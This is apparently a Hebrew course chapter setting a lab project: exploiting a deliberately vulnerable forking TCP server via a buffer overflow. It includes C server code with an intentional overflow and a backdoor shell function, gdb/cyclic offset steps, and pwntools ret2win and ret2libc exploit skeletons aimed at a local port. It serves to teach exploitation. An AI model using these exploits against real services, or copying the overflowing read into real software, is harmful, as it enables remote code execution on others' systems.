## פרויקט - ניצול שרת TCP פגיע מרחוק

הגענו לפרויקט המסכם של הפרק. עד עכשיו תקפנו בינאריים מקומיים: הרצנו אותם, האכלנו להם קלט, וקיבלנו shell על אותה מכונה. עכשיו נעשה את הקפיצה שמפרידה בין תרגיל לבין תקיפה אמיתית - נתקוף שרת רשת. השרת רץ, מקשיב על פורט, מקבל חיבורים, ובכל חיבור עושה fork לתהליך ילד שמטפל בבקשה. בתוך הטיפול הזה מסתתרת גלישת חוצץ קלאסית. המשימה שלכם: לחבר את כל מה שלמדנו בפרק - מציאת offset עם cyclic, שליטה ב-RIP, ו-ret2win - לכדי exploit אחד ומלא שנכתב ב-pwntools, מתחבר ברשת, ומחזיר לכם shell אינטראקטיבי על השרת המרוחק.
...
- **קנרי - canary** כבוי (מקמפלים עם `-fno-stack-protector`). בלי קנרי הגלישה מגיעה עד כתובת החזרה בלי שום בדיקה באמצע.
- **מנגנון PIE** כבוי (מקמפלים עם `-no-pie`). הבינארי נטען בכתובת קבועה (`0x400000`), ולכן הכתובת של הפונקציה `win` קבועה בין הרצות. זו הסיבה שאפשר לעשות ret2win בלי שום דליפת כתובת.
...
שימו לב לתמונה: יש לנו גלישה נקייה בלי קנרי, כתובות קוד קבועות, ופונקציה מוכנה שפותחת shell. זה תרחיש ret2win אידיאלי. מנגנוני ה-NX וה-ASLR קיימים, אבל אף אחד מהם לא עומד בדרך של קפיצה לכתובת קבועה בקוד.
...
```c
// vuln_server.c - forking TCP server עם גלישת חוצץ קלאסית
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
...
// פונקציית הבקדור. אין שום קריאה אליה מהקוד הרגיל -
// היא קיימת רק כדי שתקפצו אליה עם הגלישה.
void win(void) {
...
void handle_client(int fd) {
    ...
    // מפנים stdin/stdout/stderr של הילד לתוך הסוקט,
    // כך ש-system("/bin/sh") יקבל את החיבור שלנו כקלט/פלט.
    dup2(fd, 0);
    dup2(fd, 1);
    dup2(fd, 2);
    ...
    // כאן החולשה: read קורא עד 1024 בתים לתוך חוצץ של 64 בתים.
    read(0, buf, 1024);
...
int main(void) {
    signal(SIGCHLD, SIG_IGN);  // מונע תהליכי זומבי כשילד מסיים
...
בדיוק כמו שתכננו: אין קנרי, אין PIE. עכשיו נמצא את הכתובת של `win`. מכיוון שהבינארי לא stripped וגם no-pie, זה טריוויאלי:
...
- למצוא את ה-offset המדויק עד כתובת החזרה בעזרת `cyclic` ולא בניחוש.
- לחשב את כתובת היעד (`win`) אוטומטית מתוך אובייקט ה-ELF, לא כמספר קבוע מודבק בקוד.
- לטפל בבעיית היישור של המחסנית (movaps) אם היא צצה.
...
ב-gdb תראו שהילד קיבל `SIGSEGV`, וש-RIP מלא ב-`0x4141414141414141`. זהו - שולטים בזרימת הריצה. אם ה-RIP הוא בדיוק `0x4141...`, סימן שהגלישה עברה את saved rbp והגיעה לכתובת החזרה.

```text
כתובות גבוהות
+---------------------------+
| כתובת חזרה - return addr  |  <-- נדרסת. אחרי ret, RIP = מה שכתבנו
+---------------------------+
| saved rbp                 |  <-- נדרס
+---------------------------+
| char buf[64]              |  <-- הקלט מ-read מתחיל כאן
+---------------------------+
כתובות נמוכות
```
...
pwndbg> set follow-fork-mode child
pwndbg> run
# ... שולחים cyclic(200) מהטרמינל השני ...
...
קיבלנו 72. זה הגיוני: 64 בתים של החוצץ ועוד 8 בתים של saved rbp. אבל שימו לב - הקומפיילר עלול להוסיף ריפוד או להזיז את המשתנים, אז אף פעם אל תנחשו את המספר הזה. **תמיד תסמכו על מה ש-cyclic_find מחזיר בבנייה שלכם.**
...
```text
[ 72 בתים מילוי ] + [ כתובת win (8 בתים) ]
```
...
הפתרון פשוט ואלגנטי: מוסיפים גאדג'ט `ret` בודד לפני הכתובת של `win`. ה-`ret` הנוסף "בולע" 8 בתים מהמחסנית והופך את היישור. בפועל ה-payload נראה כך:

```text
[ 72 בתים מילוי ] + [ כתובת gadget: ret ] + [ כתובת win ]
```
...
def start():
    # מתחברים לשרת המרוחק. בזמן פיתוח אפשר להריץ את
    # vuln_server מקומית ולהתחבר ל-127.0.0.1.
    return remote(HOST, PORT)

def main():
    io = start()

    # אבן דרך 2: את ה-offset מוצאים פעם אחת ב-gdb עם cyclic,
    # ומקבעים אותו כאן.
    offset = 0   # TODO: החליפו בערך מ-cyclic_find

    win = elf.symbols['win']

    # אבן דרך 3: גאדג'ט ret ליישור המחסנית לפני win.
    rop = ROP(elf)
    ret = rop.find_gadget(['ret'])[0]

    payload  = b'A' * offset
    payload += p64(ret)     # TODO: הוסיפו את ה-ret רק אם צריך יישור
    payload += p64(win)

    # קוראים את הבאנר לפני ששולחים (אופציונלי, לניקיון הפלט)
...
תבנו את ה-exploit בהדרגה: קודם רק המילוי כדי לאשר קריסה, אחר כך המילוי הנכון עם ה-offset, ולבסוף היעד עם היישור.

## מלכודות נפוצות - common pitfalls

- **הפורק לא מגריל כתובות מחדש.** כשההורה עושה `fork`, הילד יורש את מפת הזיכרון של ההורה בדיוק כמו שהיא - אותו ASLR base. כלומר גם אם היה כאן PIE, כתובת שדלפתם מחיבור אחד תישאר תקפה בחיבורים הבאים, כל עוד השרת לא הופעל מחדש. זו תובנה ענקית לניצול שרתי fork, ונחזור אליה במטרות המתיחה.
- **יישור movaps.** אם ה-exploit מפיל את הילד במקום לפתוח shell, הסתכלו איפה נפל. אם הקריסה היא בתוך `do_system` על `movaps`, חסר לכם גאדג'ט `ret` ליישור. הוסיפו אותו.
...
- **קריאה של הבאנר.** אם `recvuntil` תקוע, הורידו אותו זמנית - הוא רק לניקיון פלט, לא הכרחי לניצול.
...
**מטרה 2 - הוספת PIE ודליפה שנשמרת בין fork-ים.** קמפלו מחדש בלי `-no-pie` (כלומר עם PIE דלוק). עכשיו הכתובת של `win` אקראית וה-ret2win הפשוט מת. הוסיפו לשרת חולשת דליפה קטנה (למשל הדפסה שמדליפה כתובת מהמחסנית, או שינוי ה-`printf("you said: %s", buf)` כך שתדליף מצביע), דלפו את הבסיס בחיבור אחד, וחשבו את הכתובת של `win`. הטריק: בגלל שהפורק לא מגריל מחדש, אתם יכולים לדלוף בחיבור אחד ולתקוף בחיבור נפרד עם אותה כתובת בדיוק. זה הבדל מהותי משרת שעושה `execve` בכל ילד (שם ההגרלה מתבצעת מחדש וצריך לדלוף ולתקוף באותו החיבור).

**מטרה 3 - חלופת ROP בלי פונקציית win.** מחקו את `win` מהמקור, קמפלו מחדש (no-pie, NX דלוק), ותקפו בלי הבקדור. עכשיו צריך ret2libc: מדליפים את כתובת `puts` מתוך ה-GOT בעזרת קריאה ל-`puts@plt` עם `puts@got` כארגומנט, מחשבים את בסיס ה-libc, ובונים שרשרת שקוראת ל-`system("/bin/sh")`. כאן נכנס הטריק היפה של שרת ה-fork: מכיוון שהילדים לא מגרילים כתובות מחדש, אפשר להפריד את זה לשני חיבורים - בחיבור הראשון מדליפים את בסיס ה-libc, ובחיבור השני (עם אותו בסיס בדיוק) מריצים את `system`. זו הצצה קדימה לפרק 4, אבל כל הכלים כבר בידיים שלכם. שלד:

```python
from pwn import *

context.binary = elf = ELF('./vuln_server')
libc = ELF('./libc.so.6')   # אותה libc שהשרת רץ נגדה
HOST, PORT = '127.0.0.1', 1337
OFFSET = 72

# חיבור 1: מדליפים את הכתובת של puts ומחשבים את בסיס ה-libc
io = remote(HOST, PORT)
rop = ROP(elf)
rop.raw(rop.find_gadget(['ret'])[0])   # יישור המחסנית
rop.puts(elf.got['puts'])              # puts(puts@got) - מדפיס כתובת אמיתית
io.recvuntil(b'send your request:')
...
# חיבור 2: הבסיס תקף גם כאן כי fork לא הגריל מחדש
io = remote(HOST, PORT)
rop2 = ROP(libc)
...
# ה-offset נמצא פעם אחת מקומית עם cyclic + cyclic_find תחת gdb
# (set follow-fork-mode child). בבנייה הזו הוא יצא 72.
OFFSET = 72

io  = remote(HOST, PORT)

rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]     # ליישור המחסנית לפני system
win = elf.symbols['win']
...
- **הסבר היישור** - משפט או שניים שמסבירים למה נדרש גאדג'ט ה-`ret` הנוסף (הצביעו על ה-`movaps` ב-`system`).
